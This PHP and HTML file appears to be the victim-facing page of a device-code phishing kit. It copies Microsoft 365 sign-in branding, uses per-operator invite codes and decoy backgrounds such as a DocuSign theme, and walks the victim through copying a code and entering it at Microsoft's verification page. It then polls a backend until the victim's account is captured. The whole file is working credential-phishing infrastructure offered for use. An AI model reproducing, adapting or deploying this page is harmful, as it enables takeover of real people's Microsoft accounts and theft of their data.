<?php
if (session_status() === PHP_SESSION_NONE) {
    ini_set('session.cookie_samesite', 'Lax');
    ini_set('session.use_only_cookies', 1);
    ini_set('session.cookie_httponly', 1);
    session_start();
}

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/auth/UserTokens.php';

// Resolve invite via short opaque code (?c=XXXXXXXX) — no username or bg in URL
$code     = trim($_GET['c'] ?? '');
$resolved = $code ? resolveInviteCode($code) : null;

if (!$resolved) {
    http_response_code(403);
    echo '<!DOCTYPE html><html><head><title>Invalid Link</title>
    <style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#0d0d14;color:#e8e8f0;}
    .box{text-align:center;padding:2rem;} h2{color:#e05252;margin-bottom:.5rem;} p{color:#6b6b8a;font-size:.9rem;}</style></head>
    <body><div class="box"><h2>Invalid invite link.</h2><p>Please ask for a new invite link.</p></div></body></html>';
    exit;
}

$portalUser = $resolved['portal_user'];
if ($portalUser === '__global__') {
    // For global codes, portal_user comes from active portal session
    $portalUser = $_SESSION['portal_user'] ?? null;
}
$bg = $resolved['bg'] ?? 'docusign';

// Store resolved portal user in session for inviteapi.php
$_SESSION['invite_portal_user'] = $portalUser;
$_SESSION['invite_code']        = $code;
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Add your Microsoft Account</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&family=DM+Mono:wght@300;400&display=swap" rel="stylesheet"/>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    html,body{height:100%;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
    .bg{position:fixed;inset:0;background:#0078d4;background-image:radial-gradient(ellipse 80% 60% at 10% 20%,#106ebe 0%,transparent 60%),radial-gradient(ellipse 60% 80% at 90% 80%,#005a9e 0%,transparent 60%),radial-gradient(ellipse 40% 40% at 50% 50%,#0091ff22 0%,transparent 70%);overflow:hidden}
    .bg-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);background-size:48px 48px}
    .orb{position:absolute;border-radius:50%;filter:blur(80px);opacity:.18;animation:orb 12s ease-in-out infinite alternate}
    .orb1{width:600px;height:600px;background:#40b4ff;top:-200px;left:-200px;animation-delay:0s}
    .orb2{width:500px;height:500px;background:#ffffff;top:50%;right:-100px;animation-delay:-4s}
    .orb3{width:400px;height:400px;background:#00b4d8;bottom:-150px;left:30%;animation-delay:-8s}
    @keyframes orb{from{transform:scale(1) translate(0,0)}to{transform:scale(1.2) translate(30px,20px)}}
    .bg-shapes{position:absolute;inset:0;overflow:hidden}
    .shape{position:absolute;opacity:0.07;animation:float linear infinite}
    .shape svg{display:block}
    @keyframes float{0%{transform:translateY(100vh) rotate(0deg);opacity:0}5%{opacity:.07}95%{opacity:.07}100%{transform:translateY(-200px) rotate(360deg);opacity:0}}
    #bg-inline{position:fixed;inset:0;width:100%;height:100%;z-index:0;overflow:hidden}
    #bg-inline canvas{position:fixed!important;inset:0!important;width:100%!important;height:100%!important}
    .page{position:relative;z-index:10;height:100vh;display:flex;align-items:center;justify-content:center;padding:1rem}
    .card{background:#fff;border-radius:8px;width:440px;box-shadow:0 32px 80px rgba(0,0,0,.28),0 0 0 1px rgba(255,255,255,.1);overflow:hidden;opacity:0;transform:translateY(24px) scale(.97);transition:none}
    .card.ready{animation:cardIn .45s cubic-bezier(.22,1,.36,1) forwards}
    @keyframes cardIn{from{opacity:0;transform:translateY(24px) scale(.97)}to{opacity:1;transform:translateY(0) scale(1)}}
    /* Overlay hides flash until bg is painted */
    #bg-cover{position:fixed;inset:0;background:#0d0d14;z-index:50;transition:opacity .35s ease}
    #bg-cover.fade{opacity:0;pointer-events:none}
    .card-header{padding:2rem 2.25rem 1.5rem;border-bottom:1px solid #f0f0f0}
    .ms-logo-row{display:flex;align-items:center;gap:.75rem;margin-bottom:1.5rem}
    .ms-logo{display:grid;grid-template-columns:1fr 1fr;gap:3px;width:20px;height:20px;flex-shrink:0}
    .ms-logo span:nth-child(1){background:#f25022}
    .ms-logo span:nth-child(2){background:#7fba00}
    .ms-logo span:nth-child(3){background:#00a4ef}
    .ms-logo span:nth-child(4){background:#ffb900}
    .ms-label{font-size:.88rem;color:#444;font-weight:400}
    .card-title{font-size:1.4rem;font-weight:600;color:#1a1a1a;margin-bottom:.3rem}
    .card-sub{font-size:.82rem;color:#666;line-height:1.5}
    .card-body{padding:1.75rem 2.25rem 2rem}
    .field-label{font-size:.72rem;font-weight:600;color:#444;text-transform:uppercase;letter-spacing:.5px;margin-bottom:.5rem}
    .code-block{background:#f3f2f1;border:1.5px solid #e1dfdd;border-radius:6px;padding:1rem 1.25rem;display:flex;align-items:center;gap:.75rem;margin-bottom:1.5rem;transition:border-color .2s;cursor:pointer}
    .code-block:hover{border-color:#0078d4}
    .code-text{font-family:'DM Mono',monospace;font-size:1.75rem;letter-spacing:6px;color:#0078d4;flex:1;font-weight:400}
    .copy-btn{background:#fff;border:1px solid #e1dfdd;color:#444;font-size:.75rem;font-weight:600;padding:.35rem .85rem;border-radius:4px;cursor:pointer;transition:all .15s;white-space:nowrap;font-family:inherit}
    .copy-btn:hover{background:#0078d4;color:#fff;border-color:#0078d4}
    .copy-btn.copied{background:#107c10;color:#fff;border-color:#107c10}
    .primary-btn{display:flex;align-items:center;justify-content:center;gap:.6rem;width:100%;background:#0078d4;color:#fff;border:none;font-size:.92rem;font-weight:600;padding:.85rem;border-radius:4px;cursor:pointer;text-decoration:none;transition:background .15s;font-family:inherit;margin-bottom:1.25rem}
    .primary-btn:hover{background:#106ebe}
    .primary-btn:active{background:#005a9e}
    .status-row{display:flex;align-items:center;justify-content:center;gap:.6rem;font-size:.8rem;color:#666}
    .status-dot{width:8px;height:8px;border-radius:50%;background:#0078d4;animation:blink 1.4s ease-in-out infinite;flex-shrink:0}
    @keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
    .status-err{color:#a4262c}
    .status-ok{color:#107c10}
    .success-card{text-align:center;padding:1rem 0 .5rem}
    .success-icon{font-size:3rem;margin-bottom:.75rem}
    .success-title{font-size:1.1rem;font-weight:600;color:#107c10;margin-bottom:.4rem}
    .success-sub{font-size:.82rem;color:#666}
    .steps{display:flex;flex-direction:column;gap:.6rem;margin-bottom:1.75rem}
    .step{display:flex;align-items:flex-start;gap:.75rem;font-size:.82rem;color:#444}
    .step-num{width:20px;height:20px;border-radius:50%;background:#0078d4;color:#fff;display:flex;align-items:center;justify-content:center;font-size:.65rem;font-weight:700;flex-shrink:0;margin-top:.05rem}
    .loading{text-align:center;padding:2rem;color:#666;font-size:.85rem}
  </style>
</head>
<body>
<div id="bg-cover"></div>

<?php
// Inline the background HTML directly — no separate file load needed
$bgId = preg_replace('/[^a-z0-9_-]/', '', strtolower($bg));
// Validate against actual file
if (!file_exists(__DIR__ . '/backgrounds/' . $bgId . '.html')) $bgId = 'docusign';
$bgFile = __DIR__ . '/backgrounds/' . $bgId . '.html';
if (file_exists($bgFile)) {
    // Extract just the <style> and <script> and canvas from the bg file
    $bgHtml = file_get_contents($bgFile);
    // Grab everything inside <body>...</body>
    if (preg_match('/<body[^>]*>(.*)<\/body>/si', $bgHtml, $m)) {
        echo '<div id="bg-inline" style="position:fixed;inset:0;z-index:0;overflow:hidden">' . $m[1] . '</div>';
    }
    // Grab <style> blocks
    preg_match_all('/<style[^>]*>(.*?)<\/style>/si', $bgHtml, $styles);
    foreach ($styles[1] as $s) {
        // Scope canvas and body rules to our wrapper
        $s = preg_replace('/canvas/', '#bg-inline canvas', $s);
        $s = preg_replace('/html\s*,\s*body|body/', '#bg-inline', $s);
        echo '<style>' . $s . '</style>';
    }
}
?>
<script>
// Wait for background canvas to paint its first frame, then reveal
(function(){
  var attempts = 0;
  function tryReveal(){
    var canvas = document.querySelector('#bg-inline canvas');
    if(canvas || attempts > 30){
      requestAnimationFrame(function(){
        requestAnimationFrame(function(){
          var cover = document.getElementById('bg-cover');
          var card  = document.querySelector('.card');
          if(cover) cover.classList.add('fade');
          if(card)  card.classList.add('ready');
          if(cover) setTimeout(function(){ cover.style.display='none'; }, 400);
        });
      });
    } else {
      attempts++;
      setTimeout(tryReveal, 30);
    }
  }
  tryReveal();
})();
</script>



<div class="page">
  <div class="card">
    <div class="card-header">
      <div class="ms-logo-row">
        <div class="ms-logo"><span></span><span></span><span></span><span></span></div>
        <div class="ms-label">Microsoft 365</div>
      </div>
      <div class="card-title">Add an account</div>
      <div class="card-sub">Sign in with your Microsoft or Office 365 account</div>
    </div>
    <div class="card-body" id="card-body">
      <div class="loading">Loading…</div>
    </div>
  </div>
</div>

<script>
const API   = 'inviteapi.php?c=<?= urlencode($code) ?>&';
let userCode = null, pollTm = null;

// Background picker
// Background is inlined server-side via PHP

function openSignIn() {
  const uri = window._verificationUri;
  if (!uri) return;
  const w = 520, h = 640;
  const left = Math.max(0, Math.round(screen.width  / 2 - w / 2));
  const top  = Math.max(0, Math.round(screen.height / 2 - h / 2));
  const popup = window.open(
    uri,
    'ms_signin',
    `width=${w},height=${h},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes,resizable=yes,status=no`
  );
  if (!popup || popup.closed || typeof popup.closed === 'undefined') {
    // Popups blocked — fall back to new tab
    window.open(uri, '_blank');
  }
}

async function init() {
  try {
    const r = await fetch(API + '&action=device_code', {credentials:'same-origin'});
    const d = await r.json();
    if (d.error) { showError(d.error); return; }
    userCode = d.user_code;
    document.getElementById('card-body').innerHTML = `
      <div class="steps">
        <div class="step"><div class="step-num">1</div><div>Copy the code below</div></div>
        <div class="step"><div class="step-num">2</div><div>Click the sign-in button to open Microsoft</div></div>
        <div class="step"><div class="step-num">3</div><div>Enter the code when prompted and sign in</div></div>
      </div>
      <div class="field-label">Your sign-in code</div>
      <div class="code-block" onclick="copyCode()">
        <div class="code-text" id="code-display">${escHtml(d.user_code)}</div>
        <button class="copy-btn" id="copy-btn" onclick="copyCode();event.stopPropagation()">Copy</button>
      </div>
      <button id="open-btn" onclick="openSignIn()" class="primary-btn">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 3v18M3 9h6"/></svg>
        Open Microsoft Sign-in
      </button>
      <div class="status-row">
        <div class="status-dot" id="status-dot"></div>
        <span id="status-text">Waiting for sign-in…</span>
      </div>`;
    window._verificationUri = d.verification_uri;
    poll();
  } catch(e) {
    showError('Could not reach server. Please refresh.');
  }
}

async function poll() {
  try {
    const r = await fetch(API + '&action=poll', {credentials:'same-origin'});
    const d = await r.json();
    if (d.status === 'success') {
      clearTimeout(pollTm);
      const body = document.getElementById('card-body');
      body.innerHTML = `
        <div class="success-card">
          <div class="success-icon">✅</div>
          <div class="success-title">Signed in as ${escHtml(d.account?.name||'')}</div>
          <div class="success-sub">${escHtml(d.account?.email||'')}<br/><br/>Your account has been added.<br/>You can close this tab.</div>
        </div>`;
      return;
    }
    if (d.status === 'expired')  { setStatus(d.message + ' Refresh to try again.', 'err'); return; }
    if (d.status === 'declined') { setStatus(d.message, 'err'); return; }
    if (d.status === 'error')    { setStatus(d.message, 'err'); return; }
  } catch(e) {}
  pollTm = setTimeout(poll, 4000);
}

function showError(msg) {
  document.getElementById('card-body').innerHTML = `
    <div class="success-card">
      <div class="success-icon">⚠️</div>
      <div class="success-title" style="color:#a4262c">Something went wrong</div>
      <div class="success-sub">${escHtml(msg)}</div>
    </div>`;
}

function setStatus(msg, type='') {
  const el  = document.getElementById('status-text');
  const dot = document.getElementById('status-dot');
  if (el)  { el.textContent = msg; el.className = type==='err'?'status-err':type==='ok'?'status-ok':''; }
  if (dot) { dot.style.background = type==='err'?'#a4262c':type==='ok'?'#107c10':'#0078d4'; }
}

function copyCode() {
  if (!userCode) return;
  navigator.clipboard.writeText(userCode).then(() => {
    const btn = document.getElementById('copy-btn');
    if (!btn) return;
    btn.textContent = 'Copied!'; btn.classList.add('copied');
    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2200);
  });
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

init();
</script>
</body>
</html>
